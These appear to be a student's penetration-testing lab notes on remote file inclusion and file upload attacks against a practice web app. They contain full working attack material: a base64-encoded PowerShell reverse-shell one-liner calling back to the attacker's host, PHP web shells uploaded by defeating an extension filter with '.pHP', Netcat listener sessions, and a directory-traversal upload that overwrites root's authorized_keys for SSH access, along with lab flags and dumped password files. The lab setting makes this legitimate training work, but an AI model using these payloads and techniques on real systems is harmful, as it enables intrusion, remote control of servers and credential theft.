<pre>command = "OS{558785e93a9fdcfa551752465ff36356}" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOMAXqYDrvKuG0L+G20mS7ARlXSBnLd8sxCXCB2V/CHDftnyxwQMqkc7B14GncT4dUzd1iRmrxczF6ED45Yl8lhRXwJxDOtXLYInwA/9KVgFU5ncDdooIgWe//5HW0yZDBCsKiw2IpoxfGskRMeUufiPW7x+pG/RL6wbf3YLila1cT1o/XTuESVX8DFWQEa5Lq21F7LDmoEGfUQFqf33bWA5Cy4KrUfWmiSZrlC0y2nk6qJVIDJHAmhReM2DRYjNyxKb/B5kNE7yj94kh9EmYWffAN/rlFk1JWk7gCjClp/fdpsTIANFFsyfZ0ADMpknYURWY4Urjlm7XZ+OTjx+Sn4gnQq8+/wPi4ypqKL403OMecFGhnsvI20Pefq+c44K+R52igJAEQA7z3Jv74lPUO5F9PVXyOg6N46e2j/3UCyfYKaJncfB0Zc55BU1nQKFS2SjjTvTAD7Lhg0F1q0HKbM4z12ph8OzzzMvLoOYwujt/etKXm9qMLOwMcgfA+R0k= elaine@tri-island
</pre>  
...
```

Instead of including the /usr/share/webshells/php/simple-backdoor.php webshell, include the PHP reverse shell from Pentestmonkey's Github repository. Change the $ip variable to the IP of your Kali machine and $port to 4444. Start a Netcat listener on port 4444 on your Kali machine and exploit the RFI vulnerability on VM #2 to include the PHP reverse shell. Find the flag in the /home/guybrush/.treasure/flag.txt file.

```
### Netcat listener

$ nc -nvlp 444


### RFI Rev shell

┌──(kali㉿kali)-[~]
└─$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.198/pt-monkey-php-rev-shell.php"

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.198] from (UNKNOWN) [192.168.246.16] 44510
Linux 66576cb217b8 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64 GNU/Linux
 19:30:18 up 3 min,  0 users,  load average: 0.23, 0.18, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),27(sudo)
/bin/sh: 0: can't access tty; job control turned off
$ sudo -l
Matching Defaults entries for www-data on 66576cb217b8:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 66576cb217b8:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
$ sudo cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:106::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
guybrush:x:1000:1000::/home/guybrush:/bin/bash
$ sudo cat /home/guybrush/.treasure/flag.txt
OS{60430fabfa02aa752791194b9591be5e}
```

### 9.2 File Upload Vulnerabilities

```
    Understand File Upload vulnerabilities 
    ```
    
```
    Learn how to identify File Upload vulnerabilities 
    ```
    
- ```
    Explore different vectors to exploit File Upload vulnerabilities 
    ```
    

###### Using Executable Files

- Upload files to be run by the web server.
- To identify;
    - Depending on application and usage.
        - Make educated guesses to locate upload mechanisms.
        - If app is a CMS, we can often upload an avatar.
        - If company website, upload mechanism in career section for resume.
        - If lawyer office, upload for case files.
        - Etc.
    - The mechanism may not be obvious, so carefully enumerate.

"Mountain Desserts" app, the Admin link has been replaced by an upload form. The text explains that we can upload a picture to win a contest. The tab bar also shows an XAMPP icon displayed in the current tab, indicating the web application is likely running the XAMPP stack. The text explains that the company wanted to switch to Windows, so we can assume that the web application is now running on a Windows system. Let's find out if we can upload a text file instead of an image.

```bash
kali@kali:~$ echo "this is a test" > test.txt
```

Success.

Attempt to upload the simple-backdoor.php webshell used in the previous Learning Unit. Fails due to filter. Utilize trial and error approach.

One method to bypass this filter is to change the file extension to a less-commonly used PHP file extension such as .phps or .php7. This may allow us to bypass simple filters that only check for the most common file extensions, .php and .phtml. These alternative file extensions were mostly used for older versions of PHP or specific use cases, but are still supported for compatibility in modern PHP versions.

Another way we can bypass the filter is by changing characters in the file extension to upper case. The blacklist may be implemented by comparing the file extension of the uploaded file to a list of strings containing only lower-case PHP file extensions. If so, we can update the uploaded file extension with upper-case characters to bypass the filter.

Let's try the second method, updating our simple-backdoor.php file extension from .php to .pHP. After renaming the file either in the terminal or file explorer, we'll upload it via the web form.

```bash
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
...
 Directory of C:\xampp\htdocs\meteor\uploads

04/04/2022  06:23 AM    <DIR>          .
04/04/2022  06:23 AM    <DIR>          ..
04/04/2022  06:21 AM               328 simple-backdoor.pHP
04/04/2022  06:03 AM                15 test.txt
               2 File(s)            343 bytes
               2 Dir(s)  15,410,925,568 bytes free
...
```

PowerShell one-liner for rev shell, use PowerShell on our Kali machine to encode the reverse shell one-liner. First, let's create the variable $Text, which will be used for storing the reverse shell one-liner as a string. Then, we can use the method convert6 and the property Unicode from the class Encoding to encode the contents of the $Text variable.

```bash
kali@kali:~$ pwsh
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA


PS> exit
```

As shown in Listing 32, the $EncodedText variable contains the encoded reverse shell one-liner. Let's use curl to execute the encoded one-liner via the uploaded simple-backdoor.pHP. We can add the base64 encoded string for the powershell command using the -enc parameter. We'll also need to use URL encoding for the spaces.

```bash
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

After executing the command, we should receive an incoming reverse shell in the second terminal where Netcat is listening.

```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50603
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.50.189
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254

PS C:\xampp\htdocs\meteor\uploads> whoami
nt authority\system
```

Below shows us the frameworks and languages for which Kali already offers web shells. It is important to understand that while the implementation of a web shell is dependent on the programming language, the basic process of using a web shell is nearly identical across these frameworks and languages. After we identify the framework or language of the target web application, we need to find a way to upload our web shell. The web shell needs to be placed in a location where we can access it. Next, we can provide commands to it, which are executed on the underlying system.

We should be aware that the file types of our web shells may be blacklisted via a filter or upload mechanism. In situations like this, we can try to bypass the filter as in this section. However, there are other options to consider. Web applications handling and managing files often enable users to rename or modify files. We could abuse this by uploading a file with an innocent file type like .txt, then changing the file back to the original file type of the web shell by renaming it.

```bash
kali@kali:~$ ls -la /usr/share/webshells
total 40
drwxr-xr-x   8 root root  4096 Feb 11 02:00 .
drwxr-xr-x 320 root root 12288 Apr 19 09:17 ..
drwxr-xr-x   2 root root  4096 Feb 11 01:58 asp
drwxr-xr-x   2 root root  4096 Apr 25 07:25 aspx
drwxr-xr-x   2 root root  4096 Feb 11 01:58 cfm
drwxr-xr-x   2 root root  4096 Apr 25 07:06 jsp
lrwxrwxrwx   1 root root    19 Feb 11 02:00 laudanum -> /usr/share/laudanum
drwxr-xr-x   2 root root  4096 Feb 11 01:58 perl
drwxr-xr-x   3 root root  4096 Feb 11 01:58 php
```

###### File Upload Vulnerabilities Exercises

Follow the steps above on VM #1 and exploit the file upload vulnerability. The flag is located in the C:\\xampp\\passwords.txt file as a password for the mountainadmin user.

```bash
┌──(kali㉿kali)-[~/webshells/ps]
└─$ cat ps-one-liner.md 
# PowerShell Encoded One-Liner Setup

kali@kali:~$ pwsh
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA


PS> exit
                                                                                                                                                           
┌──(kali㉿kali)-[~/webshells/ps]
└─$ cp /usr/share/webshells/php/simple-backdoor.php simple-backdoor.php
                                                                                                                                                           
┌──(kali㉿kali)-[~/webshells/ps]
└─$ ls
ps-one-liner.md  simple-backdoor.php

# php file was filtered

┌──(kali㉿kali)-[~/webshells/ps]
└─$ mv simple-backdoor.php simple-backdoor.pHP

# changing case of extension succeeded on upload, enumerated upload dir 'http://mountaindesserts.com/meteor/uploads/'

# Now prepare the PS one-liner

┌──(kali㉿kali)-[~]
└─$ pwsh  
PowerShell 7.2.6
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.


┌──(kali㉿kali)-[/home/kali]
└─PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.198",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

┌──(kali㉿kali)-[/home/kali]
└─PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

┌──(kali㉿kali)-[/home/kali]
└─PS> $EncodedText =[Convert]::ToBase64String($Bytes)

┌──(kali㉿kali)-[/home/kali]
└─PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA4ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==


# NOTE THAT we hit the uploads and php back-door directly, using a ? for the cmd param

┌──(kali㉿kali)-[~]
└─$ curl "http://mountaindesserts.com/meteor/uploads/simple-backdoor.pHP?cmd=dir"
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<pre> Volume in drive C has no label.
 Volume Serial Number is E6C8-741F

 Directory of C:\xampp\htdocs\meteor\uploads

08/27/2023  12:52 PM    <DIR>          .
05/03/2022  07:02 AM    <DIR>          ..
05/03/2022  06:21 AM                 0 $sock)
08/27/2023  12:52 PM               328 simple-backdoor.pHP
               2 File(s)            328 bytes
               2 Dir(s)   6,911,909,888 bytes free
</pre>                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl "http://mountaindesserts.com/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA4ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

┌──(kali㉿kali)-[~/webshells/ps]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.198] from (UNKNOWN) [192.168.246.189] 55269
dir


    Directory: C:\xampp\htdocs\meteor\uploads


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          5/3/2022   6:21 AM              0 $sock)                                                               
-a----         8/27/2023  12:52 PM            328 simple-backdoor.pHP                                                  


PS C:\xampp\htdocs\meteor\uploads> cat C:\xampp\passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     

5) SuperPassword (For everything):
   User: mountainadmin
   Password: OS{6348c5e6f186a48f11e5347ea7454511}
   Attention: This user can do everything in our company.. Use with care!
```

The target VM #2 is running an instance of TinyFileManager. Disable Burp before you start to avoid issues with the web application. Log in to the web application at http://192.168.50.16/index.php with the user admin and password admin@123. Find a way to get code execution by using an uploaded web shell. Display the contents of the /opt/install.txt file to get the flag.

```
# Uploaded webshell through UI

# Started nc listener

nc -nvlp 4444

# Executed web shell by navigating browser to path of shell `http://192.168.246.16/pt-monkey-php-rev-shell.php`

┌──(kali㉿kali)-[~/webshells/php]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.198] from (UNKNOWN) [192.168.246.16] 38374
Linux d5bbb1188465 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64 Linux
sh: w: not found
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/ # /bin/sh: can't access tty; job control turned off
ps
PID   USER     TIME  COMMAND
    1 root      0:00 php -S 0.0.0.0:80
   32 root      0:00 /bin/sh -i
   35 root      0:00 ps
/ # sudo -l
/ # /bin/sh: sudo: not found
cat /opt/install.txt
Hello admin team. We needed to reset all passwords to OS{daa29e627253f9e95f252e0edaa425cc}.
```

###### Using Non-Executable Files

- Examine why flaws in file uploads can have severe consequences even if there is no way for an attacker to execute the uploaded files.
- We may encounter scenarios where we find an unrestricted file upload mechanism, but cannot exploit it.
    - Example for this is Google Drive, where we can upload any file, but cannot leverage it to get system access.
    - In situations such as this, we need to leverage another vulnerability such as Directory Traversal to abuse the file upload mechanism.

Example site no longer uses PHP.

```bash
kali@kali:~$ curl http://mountaindesserts.com:8000/index.php
404 page not found

kali@kali:~$ curl http://mountaindesserts.com:8000/meteor/index.php
404 page not found

kali@kali:~$ curl http://mountaindesserts.com:8000/admin.php
404 page not found
```

Test file upload with `test.txt` capture in Burp.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts
[sudo] password for kali: 
                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ echo "test" > test.txt
```

Successfully Uploaded File: test.txt

Capture in Burp, send to Repeater, and test.

```http
POST /upload HTTP/1.1
Host: mountaindesserts.com:8000
Content-Length: 189
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://mountaindesserts.com:8000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryk5HlB2iMWd4r74v2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mountaindesserts.com:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryk5HlB2iMWd4r74v2
Content-Disposition: form-data; name="myFile"; filename="test.txt"
Content-Type: text/plain

test

------WebKitFormBoundaryk5HlB2iMWd4r74v2--
```

Same result as browser.

```http
HTTP/1.1 200 OK
Date: Sun, 27 Aug 2023 21:20:27 GMT
Content-Length: 37
Content-Type: text/plain; charset=utf-8
Connection: close

Successfully Uploaded File: test.txt
```

Check if the web application allows us to specify a relative path in the filename and write a file via Directory Traversal outside of the web root. We can do this by modifying the "filename" parameter in the request so it contains ../../../../../../../test.txt, then click send.

```http
POST /upload HTTP/1.1
Host: mountaindesserts.com:8000
Content-Length: 211
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://mountaindesserts.com:8000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryk5HlB2iMWd4r74v2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mountaindesserts.com:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryk5HlB2iMWd4r74v2
Content-Disposition: form-data; name="myFile"; filename="../../../../../../../test.txt"
Content-Type: text/plain

test

------WebKitFormBoundaryk5HlB2iMWd4r74v2--
```

Success.

```http
HTTP/1.1 200 OK
Date: Sun, 27 Aug 2023 21:24:52 GMT
Content-Length: 58
Content-Type: text/plain; charset=utf-8
Connection: close

Successfully Uploaded File: ../../../../../../../test.txt
```

- NOTE we have no way of knowing if the server placed the file per the ../ seq or just echoed out filename.
    - Let's assume relative path was used to place the file.
    - We can attempt to blindly overwrite files.

If our assumption is correct, we can try to blindly overwrite files, which may lead us to system access. We should be aware, that blindly overwriting files in a real-life penetration test could result in lost data or costly downtime of a production system. Before moving forward, let's briefly review web server accounts and permissions.

Web applications using Apache, Nginx or other dedicated web servers often run with specific users, such as www-data on Linux. Traditionally on Windows, the IIS web server runs as a Network Service account, a passwordless built-in Windows identity with low privileges. Starting with IIS version 7.5, Microsoft introduced the IIS Application Pool Identities. These are virtual accounts running web applications grouped by application pools. Each application pool has its own pool identity, making it possible to set more precise permissions for accounts running web applications.

When using programming languages that include their own web server, administrators and developers often deploy the web application without any privilege structures by running applications as root or Administrator to avoid any permissions issues. This means we should always verify whether we can leverage root or administrator privileges in a file upload vulnerability.

Attempt to overwrite `authorized_keys` in the home of root. Create SSH keypair and authorized_keys file containing pub.

```bash
┌──(kali㉿kali)-[~/.ssh]
└─$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
The key fingerprint is:
SHA256:5fyAdnZ8lhynyVsjsyBrEq4jWUJDKI+NqtSD5ugAGFQ kali@kali
The key's randomart image is:
+---[RSA 3072]----+
| .oE             |
|o. .             |
|o=.       .   . .|
|+.oo     = . o * |
|+ + .  .S.*.ooO..|
|o+ + ....oo+.o+o.|
|B   =  o o  ...  |
|+. o .. o        |
|..  ...          |
+----[SHA256]-----+
                                                                                                                                                           
┌──(kali㉿kali)-[~/.ssh]
└─$ cat fileup.pub > ~/authorized_keys 
```

Prepare the request with burp, upload authorized_keys file and capture. Send to repeater and prepare to blind overwrite.

```http
POST /upload HTTP/1.1
Host: mountaindesserts.com:8000
Content-Length: 768
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://mountaindesserts.com:8000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRHQaNDktHbJ3T2m0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mountaindesserts.com:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryRHQaNDktHbJ3T2m0
Content-Disposition: form-data; name="myFile"; filename="../../../../../../../root/.ssh/authorized_keys"
Content-Type: application/octet-stream

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqr0PVNbEyQE/2ObXfuOA/R1A/MXbNLy0uu1ErLnLvauZCPp1OSMsqL6Aji98O9iDW+qXv0N7EOtWhUROggtFQa+E/hadQIHQu/9qfdoqnxXhv7SW8ObAJeTJOgg8Ai4TuwyqKSriDG2hmnTsFRWh2gR1Jzjjdyi8QLPoopARh3cQU/PXGEiHHcOvBjBRf0rMznD9s6UbfrIN0X8GhKCXSdkUwxf3MQhlv6dQAFaXJ9Omg1Vh9yWY+OjfHb7rZhrcnbtgyJE8+G8ckFFXom/iGm4uM7c7GCAOuWYBE5YqItk55d4xHZ+jKCQEDl2GHn1SYQI9lFRItQqdLMIRfbSkn+Tom1oBuiZ5PAIEWuZLnyPLagrPoq2BhPU+8sNRZnd/U3Qmivpa1qLpiHNgLopgf7ZP0qS//bKFWFv26CN87MkkGxfi+C4a3D4DWU2yuGrG5209QVcWJmgQwWmo5lIaXIWSRdEnWMlekBV8LrnIbIYXGE0lfOZ8D9YRIgf7HoWk= kali@kali

------WebKitFormBoundaryRHQaNDktHbJ3T2m0--
```

Success.

```http
HTTP/1.1 200 OK
Date: Sun, 27 Aug 2023 21:36:31 GMT
Content-Length: 75
Content-Type: text/plain; charset=utf-8
Connection: close

Successfully Uploaded File: ../../../../../../../root/.ssh/authorized_keys
```

Connect via SSH.

```bash
┌──(kali㉿kali)-[~]
└─$ ssh -i .ssh/fileup root@mountaindesserts.com -p 2222
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.246.16]:2222)' can't be established.
ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[mountaindesserts.com]:2222' (ED25519) to the list of known hosts.
Linux 0e7132f89012 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64

